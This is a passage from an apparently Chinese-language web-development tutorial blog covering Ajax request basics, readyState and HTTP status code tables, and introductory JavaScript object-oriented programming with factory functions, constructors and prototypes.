oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		ajax(&apos;data.txt?t=&apos;+new Date().getTime(), function (str)&#123;</div><div class="line">			var arr=eval(str);</div><div class="line">			</div><div class="line">			for(var i=0;i&lt;arr.length;i++)</div><div class="line">			&#123;</div><div class="line">				var oLi=document.createElement(&apos;li&apos;);</div><div class="line">				</div><div class="line">				oLi.innerHTML=&apos;用户名：&lt;strong&gt;&apos;+arr[i].user+&apos;&lt;/strong&gt;密码：&lt;span&gt;&apos;+arr[i].pass+&apos;&lt;/span&gt;&apos;;</div><div class="line">				</div><div class="line">				oUl.appendChild(oLi);</div><div class="line">			&#125;</div><div class="line">		&#125;, function ()&#123;</div><div class="line">			alert(&apos;失败&apos;);</div><div class="line">		&#125;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;1input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;读取&quot; /&gt;</div><div class="line">&lt;ul id=&quot;ul1&quot;&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Ajax原理"><a href="#Ajax原理" class="headerlink" title="Ajax原理"></a>Ajax原理</h2><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ul>
<li>GET方法是默认的HTTP请求方法，我们日常用GET方法来提交表单数据，然而用GET方法提交的表单数据只经过了简单的编码，同时它将作为URL的一部分向Web服务器发送，因此，如果使用GET方法来提交表单数据就存在着安全隐患上</li>
<li>POST方法是GET方法的一个替代方法，它主要是向Web服务器提交表单数据，尤其是大批量的数据。POST方法克服了GET方法的一些缺点。通过POST方法提交表单数据时，数据不是作为URL请求的一部分而是作为标准数据传送给Web服务器，这就克服了GET方法中的信息无法保密和数据量太小的缺点。</li>
</ul>
<h1 id="Ajax中级"><a href="#Ajax中级" class="headerlink" title="Ajax中级"></a>Ajax中级</h1><h2 id="编写Ajax-1"><a href="#编写Ajax-1" class="headerlink" title="编写Ajax-1"></a>编写Ajax-1</h2><h3 id="创建Ajax对象"><a href="#创建Ajax对象" class="headerlink" title="创建Ajax对象"></a>创建Ajax对象</h3><ul>
<li>ActiveXObject(“Microsoft.XMLHTTP”)   //IE6</li>
<li>XMLHttpRequest()</li>
<li>全局变量是window的属性</li>
<li>用没定义的变量–报错</li>
<li>用没有定义的属性–undefined</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//1.创建Ajax对象 用属性的形式来判断</div><div class="line">if(window.XMLHttpRequest)</div><div class="line">&#123;</div><div class="line">	var oAjax=new XMLHttpRequest();</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><ul>
<li>open(方法, 文件名, 异步传输)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//2.连接服务器</div><div class="line">//open(方法, 文件名, 异步传输)</div><div class="line">oAjax.open(&apos;GET&apos;, &apos;a.txt&apos;, true);</div></pre></td></tr></table></figure>
<h4 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h4><ul>
<li>同步传输（一步一步）是一种以数据块为传输单位的数据传输方式，该方式下数据块与数据块之间的时间间隔是固定的，必须严格地规定它们的时间关系。每个数据块的头部和尾部都要附加一个特殊的字符或比特序列，标记一个数据块的开始和结束，一般还要附加一个校验序列，以便对数据块进行差错控制。</li>
<li>异步传输（一起）将比特分成小组进行传送，小组可以是8位的1个字符或更长。发送方可以在任何时刻发送这些比特组，而接收方从不知道它们会在什么时候到达。</li>
<li>Ajax就是用异步传输</li>
</ul>
<h3 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h3><ul>
<li>send()<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oAjax.send();</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="接收返回值"><a href="#接收返回值" class="headerlink" title="接收返回值"></a>接收返回值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//4.接收返回</div><div class="line">oAjax.onreadystatechange=function ()</div><div class="line">&#123;</div><div class="line">	//oAjax.readyState	//浏览器和服务器，进行到哪一步了</div><div class="line">	if(oAjax.readyState==4)	//读取完成</div><div class="line">	&#123;</div><div class="line">		if(oAjax.status==200)	//成功</div><div class="line">		&#123;</div><div class="line">			alert(&apos;成功：&apos;+oAjax.responseText);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			alert(&apos;失败:&apos;+oAjax.status);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">function ajax(url, fnSucc, fnFaild)</div><div class="line">&#123;</div><div class="line">	//1.创建Ajax对象</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	&#123;</div><div class="line">		var oAjax=new XMLHttpRequest();</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	//2.连接服务器</div><div class="line">	//open(方法, 文件名, 异步传输)</div><div class="line">	oAjax.open(&apos;GET&apos;, url, true);</div><div class="line">	</div><div class="line">	//3.发送请求</div><div class="line">	oAjax.send();</div><div class="line">	</div><div class="line">	//4.接收返回</div><div class="line">	oAjax.onreadystatechange=function ()</div><div class="line">	&#123;</div><div class="line">		//oAjax.readyState	//浏览器和服务器，进行到哪一步了</div><div class="line">		if(oAjax.readyState==4)	//读取完成</div><div class="line">		&#123;</div><div class="line">			if(oAjax.status==200)	//成功</div><div class="line">			&#123;</div><div class="line">				fnSucc(oAjax.responseText);</div><div class="line">			&#125;</div><div class="line">			else</div><div class="line">			&#123;</div><div class="line">				if(fnFaild)</div><div class="line">				&#123;</div><div class="line">					fnFaild(oAjax.status);</div><div class="line">				&#125;</div><div class="line">				//alert(&apos;失败:&apos;+oAjax.status);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="编写Ajax-2"><a href="#编写Ajax-2" class="headerlink" title="编写Ajax - 2"></a>编写Ajax - 2</h2><h3 id="请求状态监控"><a href="#请求状态监控" class="headerlink" title="请求状态监控"></a>请求状态监控</h3><h4 id="onreadystatechange事件"><a href="#onreadystatechange事件" class="headerlink" title="onreadystatechange事件"></a>onreadystatechange事件</h4><ul>
<li>onreadystatechange     存储函数（或函数名</li>
<li>每当 readyState 属性改变时，就会调用该函数。</li>
</ul>
<h4 id="readyState属性：请求状态"><a href="#readyState属性：请求状态" class="headerlink" title="readyState属性：请求状态"></a>readyState属性：请求状态</h4><table>
<thead>
<tr>
<th>readyState属性值</th>
<th style="text-align:left">请求状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>0  （未初始化）</td>
<td style="text-align:left">还没有调用open()方法</td>
</tr>
<tr>
<td>1  （载入）</td>
<td style="text-align:left">已调用send()方法，正在发送请求</td>
</tr>
<tr>
<td>2  （载入完成）</td>
<td style="text-align:left">send()方法完成，已收到全部响应内容</td>
</tr>
<tr>
<td>3  （解析）</td>
<td style="text-align:left">正在解析响应内容</td>
</tr>
<tr>
<td>4  （完成）</td>
<td style="text-align:left">响应内容解析完成，可以在客户端调用了</td>
</tr>
</tbody>
</table>
<h4 id="status属性：请求结果"><a href="#status属性：请求结果" class="headerlink" title="status属性：请求结果"></a>status属性：请求结果</h4><h5 id="1xx（临时响应）"><a href="#1xx（临时响应）" class="headerlink" title="1xx（临时响应）"></a>1xx（临时响应）</h5><p>表示临时响应并需要请求者继续执行操作的状态代码。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>100   （继续）</td>
<td style="text-align:left">请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。</td>
</tr>
<tr>
<td>101   （切换协议）</td>
<td style="text-align:left">请求者已要求服务器切换协议，服务器已确认并准备切换。</td>
</tr>
</tbody>
</table>
<h5 id="2xx-（成功）"><a href="#2xx-（成功）" class="headerlink" title="2xx （成功）"></a>2xx （成功）</h5><p>表示成功处理了请求的状态代码。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>200   （成功）</td>
<td style="text-align:left">服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。</td>
</tr>
<tr>
<td>201   （已创建）</td>
<td style="text-align:left">请求成功并且服务器创建了新的资源。</td>
</tr>
<tr>
<td>202   （已接受）</td>
<td style="text-align:left">服务器已接受请求，但尚未处理。</td>
</tr>
<tr>
<td>203   （非授权信息）</td>
<td style="text-align:left">服务器已成功处理了请求，但返回的信息可能来自另一来源。</td>
</tr>
<tr>
<td>204   （无内容）</td>
<td style="text-align:left">服务器成功处理了请求，但没有返回任何内容。</td>
</tr>
<tr>
<td>205   （重置内容）</td>
<td style="text-align:left">服务器成功处理了请求，但没有返回任何内容。</td>
</tr>
<tr>
<td>206   （部分内容）</td>
<td style="text-align:left">服务器成功处理了部分 GET 请求。</td>
</tr>
</tbody>
</table>
<h5 id="3xx-（重定向）"><a href="#3xx-（重定向）" class="headerlink" title="3xx （重定向）"></a>3xx （重定向）</h5><p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>300   （多种选择）</td>
<td style="text-align:left">针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td>
</tr>
<tr>
<td>301   （永久移动）</td>
<td style="text-align:left">请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</td>
</tr>
<tr>
<td>302   （临时移动）</td>
<td style="text-align:left">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
<tr>
<td>303   （查看其他位置）</td>
<td style="text-align:left">请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td>
</tr>
<tr>
<td>304   （未修改）</td>
<td style="text-align:left">自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</td>
</tr>
<tr>
<td>305   （使用代理）</td>
<td style="text-align:left">请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。</td>
</tr>
<tr>
<td>307   （临时重定向）</td>
<td style="text-align:left">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
</tbody>
</table>
<h5 id="4xx（请求错误）"><a href="#4xx（请求错误）" class="headerlink" title="4xx（请求错误）"></a>4xx（请求错误）</h5><p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>400   （错误请求）</td>
<td style="text-align:left">服务器不理解请求的语法。</td>
</tr>
<tr>
<td>401   （未授权）</td>
<td style="text-align:left">请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。</td>
</tr>
<tr>
<td>403   （禁止）</td>
<td style="text-align:left">服务器拒绝请求。</td>
</tr>
<tr>
<td>404   （未找到）</td>
<td style="text-align:left">服务器找不到请求的网页。</td>
</tr>
<tr>
<td>405   （方法禁用）</td>
<td style="text-align:left">禁用请求中指定的方法。</td>
</tr>
<tr>
<td>406   （不接受）</td>
<td style="text-align:left">无法使用请求的内容特性响应请求的网页。</td>
</tr>
<tr>
<td>407   （需要代理授权）</td>
<td style="text-align:left">此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td>
</tr>
<tr>
<td>408   （请求超时）</td>
<td style="text-align:left">服务器等候请求时发生超时。</td>
</tr>
<tr>
<td>409   （冲突）</td>
<td style="text-align:left">服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td>
</tr>
<tr>
<td>410   （已删除）</td>
<td style="text-align:left">如果请求的资源已永久删除，服务器就会返回此响应。</td>
</tr>
<tr>
<td>411   （需要有效长度）</td>
<td style="text-align:left">服务器不接受不含有效内容长度标头字段的请求。</td>
</tr>
<tr>
<td>412   （未满足前提条件）</td>
<td style="text-align:left">服务器未满足请求者在请求中设置的其中一个前提条件。</td>
</tr>
<tr>
<td>413   （请求实体过大）</td>
<td style="text-align:left">服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td>
</tr>
<tr>
<td>414   （请求的 URI 过长）</td>
<td style="text-align:left">请求的 URI（通常为网址）过长，服务器无法处理。</td>
</tr>
<tr>
<td>415   （不支持的媒体类型）</td>
<td style="text-align:left">请求的格式不受请求页面的支持。</td>
</tr>
<tr>
<td>416   （请求范围不符合要求）</td>
<td style="text-align:left">如果页面无法提供请求的范围，则服务器会返回此状态代码。</td>
</tr>
<tr>
<td>417   （未满足期望值）</td>
<td style="text-align:left">服务器未满足”期望”请求标头字段的要求。</td>
</tr>
</tbody>
</table>
<h5 id="5xx（服务器错误）"><a href="#5xx（服务器错误）" class="headerlink" title="5xx（服务器错误）"></a>5xx（服务器错误）</h5><p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>500   （服务器内部错误）</td>
<td style="text-align:left">服务器遇到错误，无法完成请求。</td>
</tr>
<tr>
<td>501   （尚未实施）</td>
<td style="text-align:left">服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。</td>
</tr>
<tr>
<td>502   （错误网关）</td>
<td style="text-align:left">服务器作为网关或代理，从上游服务器收到无效响应。</td>
</tr>
<tr>
<td>503   （服务不可用）</td>
<td style="text-align:left">服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td>
</tr>
<tr>
<td>504   （网关超时）</td>
<td style="text-align:left">服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td>
</tr>
<tr>
<td>505   （HTTP 版本不受支持）</td>
<td style="text-align:left">服务器不支持请求中所用的 HTTP 协议版本。</td>
</tr>
</tbody>
</table>
<h4 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h4><ul>
<li>responseText 属性：如果来自服务器的响应并非 XML，请使用 responseText 属性。</li>
<li>responseXML 属性：如果来自服务器的响应是 XML，而且需要作为 XML 对象进行解析，使用responseXML属性</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>responseText</td>
<td style="text-align:left">获得字符串形式的响应数据。</td>
</tr>
<tr>
<td>responseXML</td>
<td style="text-align:left">获得 XML 形式的响应数据。</td>
</tr>
</tbody>
</table>
<h1 id="JS面向对象基础"><a href="#JS面向对象基础" class="headerlink" title="JS面向对象基础"></a>JS面向对象基础</h1><h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><ul>
<li>JavaScript 中的所有事物都是对象：字符串、数值、数组、函数</li>
<li>JavaScript 提供多个内建对象，比如 String、Date、Array 等等。</li>
<li>对象只是带有属性和方法的特殊数据类型。</li>
</ul>
<h2 id="什么是面向对象"><a href="#什么是面向对象" class="headerlink" title="什么是面向对象"></a>什么是面向对象</h2><ul>
<li>使用对象时，只关注对象提供的功能，不关注其内部细节</li>
<li>比如JQuery</li>
</ul>
<h2 id="JS中的面向对象"><a href="#JS中的面向对象" class="headerlink" title="JS中的面向对象"></a>JS中的面向对象</h2><h3 id="面向对象编程-OOP-的特点"><a href="#面向对象编程-OOP-的特点" class="headerlink" title="面向对象编程(OOP)的特点"></a>面向对象编程(OOP)的特点</h3><ul>
<li>抽象：抓住核心问题</li>
<li>封装：不考虑内部实现，只考虑功能使用</li>
<li>继承：从已有对象上，继承出新的对象<br>多重继承<br>多态</li>
</ul>
<h3 id="对象的组成"><a href="#对象的组成" class="headerlink" title="对象的组成"></a>对象的组成</h3><ul>
<li>方法——函数：过程、动态的</li>
<li>属性——变量：状态、静态的</li>
</ul>
<h4 id="方法——函数：过程、动态的"><a href="#方法——函数：过程、动态的" class="headerlink" title="方法——函数：过程、动态的"></a>方法——函数：过程、动态的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function aaa()			//函数：自由</div><div class="line">&#123;</div><div class="line">	alert(&apos;abc&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">var arr=[1,2,3,4];</div><div class="line"></div><div class="line">arr.aaa=function ()		//方法：属于一个对象</div><div class="line">&#123;</div><div class="line">	alert(&apos;abc&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">aaa();</div><div class="line">arr.aaa();</div></pre></td></tr></table></figure>
<h4 id="属性——变量：状态、静态的"><a href="#属性——变量：状态、静态的" class="headerlink" title="属性——变量：状态、静态的"></a>属性——变量：状态、静态的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var a=12;		//变量：自由的，不属于任何人</div><div class="line"></div><div class="line">alert(a);</div><div class="line"></div><div class="line">var arr=[1,2,3,4,5,6];</div><div class="line"></div><div class="line">arr.a=12;		//属性：属于一个对象的</div><div class="line"></div><div class="line">alert(arr.a);</div></pre></td></tr></table></figure>
<h2 id="第一个面向对象程序"><a href="#第一个面向对象程序" class="headerlink" title="第一个面向对象程序"></a>第一个面向对象程序</h2><h3 id="为对象添加方法和属性"><a href="#为对象添加方法和属性" class="headerlink" title="为对象添加方法和属性"></a>为对象添加方法和属性</h3><h4 id="this详解，事件处理中this的本质"><a href="#this详解，事件处理中this的本质" class="headerlink" title="this详解，事件处理中this的本质"></a>this详解，事件处理中this的本质</h4><ul>
<li>当前发生事件的对象</li>
<li>当前的方法所属的对象</li>
</ul>
<h4 id="不能在系统对象中随意附加方法、属性，否则会覆盖已有方法、属性"><a href="#不能在系统对象中随意附加方法、属性，否则会覆盖已有方法、属性" class="headerlink" title="不能在系统对象中随意附加方法、属性，否则会覆盖已有方法、属性"></a>不能在系统对象中随意附加方法、属性，否则会覆盖已有方法、属性</h4><h4 id="object对象"><a href="#object对象" class="headerlink" title="object对象"></a>object对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function createPerson(name, qq)		//构造函数</div><div class="line">&#123;</div><div class="line">	var obj=new Object();</div><div class="line">	</div><div class="line">	obj.name=name;</div><div class="line">	obj.qq=qq;</div><div class="line">	</div><div class="line">	obj.showName=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;;</div><div class="line">	obj.showQQ=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	return obj;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</div><div class="line"></div><div class="line">obj.showName();</div><div class="line">obj.showQQ();</div><div class="line"></div><div class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</div><div class="line"></div><div class="line">obj2.showName();</div><div class="line">obj2.showQQ();</div></pre></td></tr></table></figure>
<h2 id="工厂方式"><a href="#工厂方式" class="headerlink" title="工厂方式"></a>工厂方式</h2><h3 id="什么是工厂"><a href="#什么是工厂" class="headerlink" title="什么是工厂"></a>什么是工厂</h3><ul>
<li>原料</li>
<li>加工</li>
<li>出厂</li>
</ul>
<h3 id="工厂方式-1"><a href="#工厂方式-1" class="headerlink" title="工厂方式"></a>工厂方式</h3><ul>
<li>用构造函数创建一个类</li>
<li>什么是类、对象（实例）：模具和零件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">function createPerson(name, qq)		//构造函数</div><div class="line">&#123;</div><div class="line">	//原料</div><div class="line">	var obj=new Object();</div><div class="line">	</div><div class="line">	//加工</div><div class="line">	obj.name=name;</div><div class="line">	obj.qq=qq;</div><div class="line">	</div><div class="line">	obj.showName=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;;</div><div class="line">	obj.showQQ=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	//出厂</div><div class="line">	return obj;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</div><div class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</div><div class="line"></div><div class="line">alert(obj.showName==obj2.showName);</div></pre></td></tr></table></figure>
<h2 id="工厂方式的问题"><a href="#工厂方式的问题" class="headerlink" title="工厂方式的问题"></a>工厂方式的问题</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul>
<li>没有new</li>
<li>函数重复定义<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">function createPerson(name, qq)		//构造函数</div><div class="line">&#123;</div><div class="line">	//原料</div><div class="line">	var obj=new Object();</div><div class="line">	</div><div class="line">	//加工</div><div class="line">	obj.name=name;</div><div class="line">	obj.qq=qq;</div><div class="line">	</div><div class="line">	obj.showName=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;;</div><div class="line">	obj.showQQ=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	//出厂</div><div class="line">	return obj;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</div><div class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</div><div class="line"></div><div class="line">alert(obj.showName==obj2.showName);</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="加上new"><a href="#加上new" class="headerlink" title="加上new"></a>加上new</h3><ul>
<li>偷偷做了两件事</li>
<li>替你创建了一个空白对象</li>
<li>替你返回了这个对象</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">function createPerson(name, qq)		//构造函数</div><div class="line">&#123;</div><div class="line">	//系统偷偷替咱们做：</div><div class="line">	//var this=new Object();</div><div class="line">	</div><div class="line">	//加工</div><div class="line">	this.name=name;</div><div class="line">	this.qq=qq;</div><div class="line">	</div><div class="line">	this.showName=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的名字叫：&apos;+this.name);</div><div class="line">	&#125;;</div><div class="line">	this.showQQ=function ()</div><div class="line">	&#123;</div><div class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	//也会偷偷做一些：</div><div class="line">	//return this;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var obj=new createPerson(&apos;blue&apos;, &apos;258248832&apos;);</div><div class="line">var obj2=new createPerson(&apos;张三&apos;, &apos;45648979879&apos;);   //new</div><div class="line"></div><div class="line">obj.showName();</div><div class="line">obj.showQQ();</div><div class="line">//alert(obj.showName==obj2.showName);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="原型——prototype"><a href="#原型——prototype" class="headerlink" title="原型——prototype"></a>原型——prototype</h2><h3 id="什么是原型"><a href="#什么是原型" class="headerlink" title="什么是原型"></a>什么是原型</h3><ul>
<li>原型是class，修改他可以影响一类元素</li>
<li>在已有对象中加入自己的属性、方法</li>
<li>原型修改对已有对象的影响</li>
</ul>
<h3 id="为Array添加sum方法"><a href="#为Array添加sum方法" class="headerlink" title="为Array添加sum方法"></a>为Array添加sum方法</h3><ul>
<li>给对象添加方法，类似于行间样式</li>
<li>给原型添加方法，类似于class</li>
</ul>
<h3 id="原型的小缺陷"><a href="#原型的小缺陷" class="headerlink" title="原型的小缺陷"></a>原型的小缺陷</h3><ul>
<li>无法限制覆盖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">var arr1=new Array(12,55,34,78,676);</div><div class="line">var arr2=new Array(12,33, 1);</div><div class="line"></div><div class="line">Array.prototype.sum=function ()	//class</div><div class="line">//arr1.sum=function ()				//行间样式</div><div class="line">&#123;</div><div class="line">	var result=0;</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;this.length;i++)</div><div class="line">	&#123;</div><div class="line">		result+=this[i];</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	return result;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">alert(arr1.sum());</div><div class="line">alert(arr2.sum());	//?</div></pre></td></tr></table></figure>
